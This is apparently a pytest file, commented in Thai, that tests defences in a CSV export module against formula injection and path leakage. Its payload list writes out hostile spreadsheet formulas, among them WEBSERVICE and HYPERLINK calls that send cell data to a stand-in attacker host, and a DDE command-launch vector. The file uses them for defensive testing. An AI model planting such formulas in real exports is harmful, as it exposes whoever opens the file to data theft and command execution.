# -*- coding: utf-8 -*-
"""การส่งออก CSV — กัน formula injection และกันข้อมูลรั่ว

🔴 คำสั่ง Bo · `BO REVIEW COMPLETE` (Issue #1) · SECURITY PRIORITY ข้อ 3 · 4 —
*"CSV/formula-injection protection before any evidence export"* และ
*"workbook-content leakage tests"*

ความเสี่ยงนี้ **ไม่ใช่เรื่องสมมติ**สำหรับระบบนี้ — ป้ายแถวและหัวคอลัมน์ทุกตัว
มาจากสมุดงานของหน่วยงาน ระบบไม่ได้เป็นผู้แต่งข้อความเหล่านั้นเอง

**สายงานผลิตภัณฑ์ · `PRODUCT EVIDENCE — POST-FREEZE`**
"""
import csv
import io

import pytest

from redbook import config, privacy
from redbook.export import csv_safe


def _cells(text: str) -> list[list[str]]:
    return list(csv.reader(io.StringIO(text)))


# ══════════════════════════════════════════════════════════════════════════════
#  X1 — formula injection
# ══════════════════════════════════════════════════════════════════════════════


@pytest.mark.parametrize("payload", [
    "=1+1",
    "=HYPERLINK(\"http://evil.example/?x=\"&A1,\"คลิก\")",
    "=WEBSERVICE(\"http://evil.example/steal\")",
    "=cmd|'/c calc'!A1",
    "+1+1",
    "-1+1",
    "@SUM(A1:A9)",
    "\t=1+1",
    # 🔴 สองกรณีนี้เจอจากการรันจริง — อักขระควบคุมถูกเปลี่ยนเป็นช่องว่างก่อน
    # ทำให้ ``=`` ไม่ได้อยู่ต้นเซลล์อีกต่อไป และเคยรอดด่านไปได้
    "\r=1+1",
    " =1+1",
    "\n@SUM(A1:A9)",
])
def test_x1_every_known_formula_vector_is_neutralized(payload):
    text, report = csv_safe.rows_to_text(["ป้ายแถว"], [[payload]])
    body = _cells(text)[1][0]
    assert body.startswith(csv_safe.TEXT_MARKER), f"ไม่ได้กัน: {body!r}"
    assert report.neutralized >= 1


def test_x2_neutralizing_keeps_the_original_value_visible():
    """🔴 เติมนำหน้า ไม่ใช่ลบอักขระทิ้ง

    ถ้าลบ ``-`` ทิ้ง ยอด ``-1,500`` จะกลายเป็น ``1,500`` ซึ่งอันตรายกว่าสูตรที่รัน
    """
    text, _ = csv_safe.rows_to_text(None, [["-1,500.25"]])
    assert _cells(text)[0][0] == "'-1,500.25"


def test_x3_ordinary_values_are_untouched():
    rows = [["รวมทั้งสิ้น", "1,234.5678", "ล้านบาท", "2570"]]
    text, report = csv_safe.rows_to_text(["ก", "ข", "ค", "ง"], rows)
    assert _cells(text)[1] == rows[0]
    assert report.neutralized == 0 and report.modified == 0


def test_x4_header_row_is_protected_too():
    """หัวคอลัมน์ก็มาจากสมุดงานของผู้ใช้ ไม่ใช่ข้อความที่ระบบแต่งเอง"""
    text, report = csv_safe.rows_to_text(["=1+1"], [["ปกติ"]])
    assert _cells(text)[0][0].startswith(csv_safe.TEXT_MARKER)
    assert report.neutralized == 1


def test_x5_separators_and_quotes_cannot_break_the_row_structure():
    rows = [['ก,ข', 'ค"ง', "จ;ฉ"]]
    text, _ = csv_safe.rows_to_text(None, rows)
    assert _cells(text) == rows, "ค่าที่มีตัวคั่นต้องอ่านกลับได้เหมือนเดิม"


def test_x6_newlines_inside_a_cell_are_stripped_not_kept():
    """🔴 ขึ้นบรรทัดใหม่กลางเซลล์ทำให้ผู้อ่านนับแถวผิดได้"""
    text, report = csv_safe.rows_to_text(None, [["บรรทัดหนึ่ง\nบรรทัดสอง"]])
    got = _cells(text)
    assert len(got) == 1, "ต้องยังเป็นแถวเดียว"
    assert "\n" not in got[0][0]
    assert report.stripped == 1


def test_x7_none_becomes_empty_not_the_word_none():
    text, _ = csv_safe.rows_to_text(None, [[None, ""]])
    assert _cells(text)[0] == ["", ""]


# ══════════════════════════════════════════════════════════════════════════════
#  X2 — ข้อมูลรั่ว
# ══════════════════════════════════════════════════════════════════════════════


def test_x10_absolute_paths_are_redacted_inside_cells():
    text, report = csv_safe.rows_to_text(
        None, [[r"อ่านจาก C:\Users\someone\งบ2570.xlsx"]])
    assert privacy.find_absolute_paths(text) == []
    assert "someone" not in text
    assert report.redacted == 1


def test_x11_write_refuses_when_a_path_would_still_leak(tmp_path, monkeypatch):
    """ด่านสุดท้ายต้องล้มดัง ๆ ไม่ใช่เขียนไฟล์ที่มีชื่อบัญชีผู้ใช้ออกไปเงียบ ๆ"""
    monkeypatch.setattr(csv_safe.privacy, "redact_text", lambda s: str(s))
    target = tmp_path / "out.csv"
    with pytest.raises(ValueError):
        csv_safe.write_csv(target, None, [[r"C:\Users\someone\x.xlsx"]])
    assert not target.exists(), "🔴 ห้ามสร้างไฟล์เมื่อด่านไม่ผ่าน"


def test_x12_written_file_has_no_absolute_paths(tmp_path):
    target = tmp_path / "out.csv"
    csv_safe.write_csv(target, ["ที่มา"],
                       [[str(config.UPLOAD_DIR / "ab12.xlsx")]])
    body = target.read_text(encoding="utf-8-sig")
    assert privacy.find_absolute_paths(body) == []


def test_x13_written_file_starts_with_a_bom_for_excel(tmp_path):
    """Excel บนวินโดวส์อ่านไทยจาก UTF-8 ไม่มี BOM เป็นอักขระเพี้ยน

    ผู้ตรวจจะเห็นไฟล์เสียแล้วเข้าใจว่า **ข้อมูล** เสีย ซึ่งเป็นความเข้าใจผิดที่แพง
    """
    target = tmp_path / "out.csv"
    csv_safe.write_csv(target, ["ป้ายแถว"], [["รวมทั้งสิ้น"]])
    assert target.read_bytes().startswith(b"\xef\xbb\xbf")
    assert "รวมทั้งสิ้น" in target.read_text(encoding="utf-8-sig")


# ══════════════════════════════════════════════════════════════════════════════
#  X3 — การรายงานว่าไฟล์ถูกแก้
# ══════════════════════════════════════════════════════════════════════════════


def test_x20_report_states_that_the_file_is_not_a_verbatim_copy():
    """🔴 ผู้อ่านต้องรู้ว่าไฟล์ที่ได้ไม่เท่ากับข้อมูลดิบ"""
    _, report = csv_safe.rows_to_text(None, [["=1+1"]])
    note = report.note()
    assert "ไม่ใช่สำเนาตรงตัว" in note
    assert "1" in note


def test_x21_report_says_so_when_nothing_was_changed():
    _, report = csv_safe.rows_to_text(None, [["ปกติ"]])
    assert "ไม่มีเซลล์ใดถูกแก้" in report.note()
    assert report.modified == 0


def test_x22_counts_add_up():
    rows = [["=1+1", r"C:\Users\someone\a.xlsx", "ก\nข", "ปกติ"]]
    _, report = csv_safe.rows_to_text(None, rows)
    assert report.rows == 1 and report.cells == 4
    assert report.neutralized == 1 and report.redacted == 1
    assert report.stripped == 1
    assert report.modified == 3


# ══════════════════════════════════════════════════════════════════════════════
#  X4 — การส่งออกยังไม่ถูกเปิดใช้งาน
# ══════════════════════════════════════════════════════════════════════════════


def test_x30_export_route_exists_and_is_csrf_protected():
    """เดิม: Bo สั่งให้รอ ห้ามมีเส้นทางส่งออก · กิ๊ฟอนุมัติ 7 ก.ย. (ข้อ E)
    ด่านนี้จึงกลับด้าน — ต้องมีเส้นทาง และการเขียนไฟล์ต้องเป็น POST เท่านั้น"""
    from redbook.app import create_app

    routes = {(r.path, tuple(sorted(r.methods))) for r in create_app().routes
              if hasattr(r, "path") and hasattr(r, "methods")}
    assert ("/t1b/runs/{rid}/export", ("GET",)) in routes
    assert ("/t1b/runs/{rid}/export", ("POST",)) in routes
    assert ("/t1b/exports/{name}", ("GET",)) in routes


def test_x31_nothing_calls_write_csv_from_the_web_layer():
    import inspect

    import redbook.app as appmod

    src = inspect.getsource(appmod)
    assert "csv_safe" not in src and "write_csv" not in src
